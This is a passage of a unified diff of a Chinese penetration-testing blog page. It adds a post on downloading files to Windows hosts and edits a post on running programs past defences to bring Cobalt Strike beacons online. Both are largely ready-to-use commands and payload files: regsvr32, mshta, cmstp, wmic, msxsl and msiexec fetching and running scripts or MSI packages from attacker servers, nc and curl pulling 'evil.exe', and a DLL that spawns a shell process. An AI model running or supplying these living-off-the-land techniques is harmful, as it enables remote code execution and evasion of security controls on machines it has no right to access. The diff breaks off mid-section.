+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.xsl  http:&#x2F;&#x2F;xx.xxx.xx.xx:8011&#x2F;test.xsl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821142928346.png" alt="image-20200821142928346"></p>
+<p>​        xsl文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>​        首先在自己的服务端执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444 &lt; evil.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821145912928.png" alt="image-20200821145912928"></p>
+<p>​        在客户端执行下面的命令进行文件下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  xxxxx 4444 &gt;evil.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150020632.png" alt="image-20200821150020632"></p>
+<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>​        有些主机上安装了curl，因此也可以使用curl进行文件下载操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;xxx:1234&#x2F;evil.exe -o test123123.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150327583.png" alt="image-20200821150327583"></p>
+<h4 id="chfs"><a href="#chfs" class="headerlink" title="chfs"></a>chfs</h4><p>​        这款工具可以在主机上开启一个web服务，我们可以通过这个web服务对主机上的文件进行增删改查，这个方式比较适合在内网去使用。</p>
+<p>​        上传到目标主机，在某个目录下执行这个文件，即可将当前目录共享出去</p>
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821155948134.png" alt="image-20200821155948134"></p>
+<p>​        在web下访问，即可对目录下的文件进行操作。</p>
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821160044054.png" alt="image-20200821160044054"></p>
+<h3 id="SMB协议下载"><a href="#SMB协议下载" class="headerlink" title="SMB协议下载"></a>SMB协议下载</h3><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\jerry\Desktop\test666.inf \\192.168.3.144\c$\windows\temp\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821164751755.png" alt="image-20200821164751755"></p>
+<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>​        使用这种方式可以在本地加载远程的文件执行 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;k \\192.168.3.144\c$\windows\temp\calc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821165453771.png" alt="image-20200821165453771"></p>
+<h4 id="cscript"><a href="#cscript" class="headerlink" title="cscript"></a>cscript</h4><p>​        使用这种方式可以加载远程的js并且执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript  \\192.168.3.144\c$\windows\temp\test.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821170207437.png" alt="image-20200821170207437"></p>
+<h4 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h4><p>​        使用这种方式可以加载远程的dll进行执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe &#x2F;a &#123;regsvr \\192.168.3.144\c$\windows\temp\test.dll&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821172655915.png" alt="image-20200821172655915"></p>
+<p>​        需要注意编译的dll的版本要和windows的版本相对应。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        关于windows下文件下载的方式先总结这么多，这些文件下载方式的种类虽然非常多，还是要选择适合自己当前环境的方式来选择对应的方法利用。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://evi1cg.me/archives/remote_exec.html" target="_blank" rel="noopener">windows命令执行漏洞不会玩？ 看我！</a></p>
+<p><a href="https://payloads.online/archivers/2017-11-08/1#0x02-ipc" target="_blank" rel="noopener">Windows下命令行下载文件总结</a></p>
+<p><a href="https://xz.aliyun.com/t/7937#toc-3" target="_blank" rel="noopener">windows/Linux文件下载方式汇总</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/10/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B%E7%9A%84%E6%80%9D%E8%80%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -234,7 +525,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-08-10 19:05:01" itemprop="dateModified" datetime="2020-08-10T19:05:01+08:00">2020-08-10</time>
+                <time title="Modified: 2020-08-12 14:09:58" itemprop="dateModified" datetime="2020-08-12T14:09:58+08:00">2020-08-12</time>
               </span>
 
           
@@ -251,60 +542,60 @@
           <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有时候我们想让目标执行我们的程序上线CS,但是直接调用CMD去执行exe是会被拦截的，遇到这种情况有什么方法可以执行我们的程序。</span><br></pre></td></tr></table></figure>
 
 <h3 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h3><p><strong>Regsvr32是什么？</strong></p>
-<p>​        Regsvr32命令用来向系统注册控件或者卸载控件的命令。</p>
+<p> Regsvr32命令用来向系统注册控件或者卸载控件的命令。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法：Regsvr32 [&#x2F;s][&#x2F;u] [&#x2F;n] [&#x2F;i[:cmdline]] &lt;dllname&gt;</span><br><span class="line">· &#x2F;u：注销服务器；</span><br><span class="line">· &#x2F;i：调用DllInstall传递一个可选的[cmdline]，当它与&#x2F;u一起使用时，它会调用dll uninstall。</span><br><span class="line">· &#x2F;n：不要调用DllRegisterServer，此选项必须与&#x2F;i一起使用</span><br><span class="line">· &#x2F; s ：沉默，不显示消息框；</span><br></pre></td></tr></table></figure>
 
 <p><strong>如何使用regsvr32执行exe？</strong></p>
-<p>​        首先准备一个sct文件放到服务器上,文件内容如下</p>
+<p> 首先准备一个sct文件放到服务器上,文件内容如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;registration</span><br><span class="line">    description&#x3D;&quot;Empire&quot;</span><br><span class="line">    progid&#x3D;&quot;Empire&quot;</span><br><span class="line">    version&#x3D;&quot;1.00&quot;</span><br><span class="line">    classid&#x3D;&quot;&#123;20001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">	&gt;</span><br><span class="line">	&lt;!-- regsvr32 &#x2F;s &#x2F;i&quot;C:\Bypass\Backdoor.sct&quot; scrobj.dll --&gt;</span><br><span class="line">	&lt;!-- regsvr32 &#x2F;s &#x2F;i:http:&#x2F;&#x2F;server&#x2F;Backdoor.sct scrobj.dll --&gt;</span><br><span class="line">	&lt;!-- That should work over a proxy and SSL&#x2F;TLS... --&gt;</span><br><span class="line">	&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span><br><span class="line">	&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">			var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);	</span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line"></span><br><span class="line">&lt;public&gt;</span><br><span class="line">    &lt;method name&#x3D;&quot;Exec&quot;&gt;&lt;&#x2F;method&gt;</span><br><span class="line">&lt;&#x2F;public&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">	function Exec()</span><br><span class="line">	&#123;</span><br><span class="line">		var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>
 
-<p>​        将这个文件保存好放到服务器上，再通过如下命令加载执行</p>
+<p> 将这个文件保存好放到服务器上，再通过如下命令加载执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;xx.xxx.xx.xxx:8011&#x2F;test.sct scrobj.dll</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807155737189.png" alt="image-20200807155737189"></p>
 <h3 id="MSHTA"><a href="#MSHTA" class="headerlink" title="MSHTA"></a>MSHTA</h3><p><strong>什么是MSHTA?</strong></p>
-<p>​        mshta是一个可以用来执行hta文件的命令</p>
+<p> mshta是一个可以用来执行hta文件的命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:801&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>
 
-<p>​        hta文件内容如下</p>
+<p> hta文件内容如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot; </span><br><span class="line">self.close</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt; </span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200806202058071.png" alt="image-20200806202058071"></p>
-<h3 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h3><p>​        控制面板就不用多讲了，直接看如何通过control去执行命令，首先将如下的内容编译为dll</p>
+<h3 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h3><p> 控制面板就不用多讲了，直接看如何通过control去执行命令，首先将如下的内容编译为dll</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">WinExec(&quot;cmd.exe &#x2F;c calc&quot;, SW_SHOW);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>​        将生成的dll文件重命名为cpl，通过下面的命令执行cpl文件，加载cpl文件需要使用绝对路径</p>
+<p> 将生成的dll文件重命名为cpl，通过下面的命令执行cpl文件，加载cpl文件需要使用绝对路径</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">control.exe c:\xxxx\xxxxxxx\xxxxx.cpl</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200806203405876.png" alt="image-20200806203405876"></p>
-<p>​        也可以通过其他的方式加载执行</p>
+<p> 也可以通过其他的方式加载执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe shell32.dll,Control_RunDLL  C:\xx\xxxx\xxx\Dll4.cpl</span><br><span class="line">rundll32.exe shell32.dll,Control_RunDLLAsUser C:\Users\jerry\Desktop\Dll4.cpl</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200806210718338.png" alt="image-20200806210718338"></p>
-<h3 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h3><p>​        CMSTP是一个与Microsoft连接管理器配置文件安装程序关联的二进制文件。它接受INF文件，这些文件可以通过恶意命令武器化，以脚本（SCT）和DLL的形式执行任意代码。</p>
+<h3 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h3><p> CMSTP是一个与Microsoft连接管理器配置文件安装程序关联的二进制文件。它接受INF文件，这些文件可以通过恶意命令武器化，以脚本（SCT）和DLL的形式执行任意代码。</p>
 <p><strong>如何使用cmstp执行sct脚本?</strong></p>
-<p>​        首先将我们准备好的sct文件上传到web上，再编写inf文件去加载远程的sct文件，inf文件内容如下</p>
+<p> 首先将我们准备好的sct文件上传到web上，再编写inf文件去加载远程的sct文件，inf文件内容如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;10.0.0.2&#x2F;tmp&#x2F;powersct.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Pentestlab&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Pentestlab&quot;</span><br></pre></td></tr></table></figure>
 
-<p>​        使用cmst调用inf脚本加载远程sct文件</p>
+<p> 使用cmst调用inf脚本加载远程sct文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;s xxx.inf</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807163918589.png" alt="image-20200807163918589"></p>
 <h3 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h3><p><strong>msiexec是什么？</strong></p>
-<p>​        msiexec是一个windows系统自带的命令，可以用来安装Windows Installer安装包（MSI）</p>
+<p> msiexec是一个windows系统自带的命令，可以用来安装Windows Installer安装包（MSI）</p>
 <p><strong>如何制作msi文件？</strong></p>
-<p>​        我们知道msiexec只能执行msi文件，所以我们有必要了解msi文件该如何制作</p>
-<p>​        首先可以使用msf制作msi</p>
+<p> 我们知道msiexec只能执行msi文件，所以我们有必要了解msi文件该如何制作</p>
+<p> 首先可以使用msf制作msi</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;exec CMD&#x3D;cmd.exe -f msi &gt; cmd.msi</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807154506118.png" alt="image-20200807154506118"></p>
-<p>​        使用Advanced Installer制作msi文件，首先创建一个工程，创建好以后界面如下：</p>
+<p> 使用Advanced Installer制作msi文件，首先创建一个工程，创建好以后界面如下：</p>
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807160241692.png" alt="image-20200807160241692"></p>
-<p>​        找到用户自定义行为，加载文件，配置加载cmd文件</p>
+<p> 找到用户自定义行为，加载文件，配置加载cmd文件</p>
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807160620661.png" alt="image-20200807160620661"></p>
-<p>​        还需要在生成的时候进行设置，设置后build即可生成一个msi文件</p>
+<p> 还需要在生成的时候进行设置，设置后build即可生成一个msi文件</p>
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807162456780.png" alt="image-20200807162456780"></p>
-<p>​        安装后我们的命令就会被执行</p>
+<p> 安装后我们的命令就会被执行</p>
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807162547512.png" alt="image-20200807162547512"></p>
 <p><strong>如何使用msiexec执行？</strong></p>
 <p>方法一：直接双击执行</p>
@@ -317,144 +608,144 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.0.107&#x2F;cmd.msi</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807155239472.png" alt="image-20200807155239472"></p>
-<h3 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h3><p>​        forfiles可以选择文件并在其上运行命令。</p>
+<h3 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h3><p> forfiles可以选择文件并在其上运行命令。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m notepad.exe &#x2F;c calc.exe</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807165115936.png" alt="image-20200807165115936"></p>
-<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>​        首先准备一个xsl文件，文件内容如下</p>
+<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p> 首先准备一个xsl文件，文件内容如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
 
-<p>​        将这个文件上传到web服务器上，再通过下面的命令加载执行,地址那需要加双引号，否则会有异常</p>
+<p> 将这个文件上传到web服务器上，再通过下面的命令加载执行,地址那需要加双引号，否则会有异常</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get brief &#x2F;format:&quot;http:&#x2F;&#x2F;192.168.0.107:8080&#x2F;launcher.xsl&quot;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807171443469.png" alt="image-20200807171443469"></p>
-<h3 id="Msxsl"><a href="#Msxsl" class="headerlink" title="Msxsl"></a>Msxsl</h3><p>​        msxsl虽然可以加载远程的文件执行，但是它不是windows自带的，需要去下载，好在这个文件本身也不大，就20k的样子，可以直接传给目标主机。</p>
-<p>​        通过如下方式执行xsl</p>
+<h3 id="Msxsl"><a href="#Msxsl" class="headerlink" title="Msxsl"></a>Msxsl</h3><p> msxsl虽然可以加载远程的文件执行，但是它不是windows自带的，需要去下载，好在这个文件本身也不大，就20k的样子，可以直接传给目标主机。</p>
+<p> 通过如下方式执行xsl</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.xsl  http:&#x2F;&#x2F;xx.xxx.xx.xx:8011&#x2F;test.xsl</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807172754499.png" alt="image-20200807172754499"></p>
-<h3 id="msbuild"><a href="#msbuild" class="headerlink" title="msbuild"></a>msbuild</h3><p>​        使用msbuild可以编译xml c#的项目文件，msbuild.exe并不在windows的环境变量中，因此需要绝对路径进行加载。</p>
+<h3 id="msbuild"><a href="#msbuild" class="headerlink" title="msbuild"></a>msbuild</h3><p> 使用msbuild可以编译xml c#的项目文件，msbuild.exe并不在windows的环境变量中，因此需要绝对路径进行加载。</p>
 <p><strong>如何使用msbuild执行？</strong></p>
